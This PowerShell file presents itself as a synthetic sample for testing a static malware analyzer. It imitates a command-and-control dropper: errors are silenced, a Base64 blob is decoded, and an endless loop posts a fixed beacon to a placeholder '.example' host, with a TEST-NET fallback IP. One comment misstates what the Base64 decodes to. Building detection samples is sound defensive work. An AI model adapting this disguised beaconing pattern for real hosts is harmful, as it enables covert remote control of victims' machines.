# ============================================================================
#  SYNTHETIC TRAINING ARTIFACT - NOT MALWARE - SAFE FOR DEMO AND CI
#  Scenario : powershell_c2_beaconing
#  Purpose  : Static-analysis sample for SentinelForge. Contains the classic
#             INDICATORS of a C2 dropper (encoded command, hidden window,
#             periodic beacon) while doing nothing harmful: every destination
#             is an RFC-2606 ".example" domain and every IP is TEST-NET.
#            The analyzer NEVER executes this file; it only parses text.
# ============================================================================

$ErrorActionPreference = 'SilentlyContinue'

function Get-UpdateConfig {
    # Base64 below decodes to: "SYNTHETIC-DEMO-PAYLOAD (see sandbox/analyzers)"
    $encoded = 'U1lOVEhFVElDLURFTU8tUEFZTE9BRCAoc2VlIHNhbmRwbGVkYXIvYW5hbHl6ZXIp'
    $config = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
    return $config
}

function Start-SyncLoop {
    param(
        [string]$Target = 'metrics-telemetry-cdn.example',
        [int]$Port = 443,
        [int]$IntervalSeconds = 15
    )
    $endpoint = "https://$Target`:$Port/telemetry"
    while ($true) {
        try {
            # Beacon: small, fixed-size POST at a fixed cadence
            Invoke-WebRequest -Uri $endpoint -Method Post -Body ('{"s":1}') `
                -ContentType 'application/json' | Out-Null
        } catch { }
        Start-Sleep -Seconds $IntervalSeconds
    }
}

$config = Get-UpdateConfig
Write-Output $config
Start-SyncLoop -Target 'metrics-telemetry-cdn.example' -Port 443 -IntervalSeconds 15

# Fallback host if primary DNS fails (never contacted in the sandbox)
$fallback = '203.0.113.66'
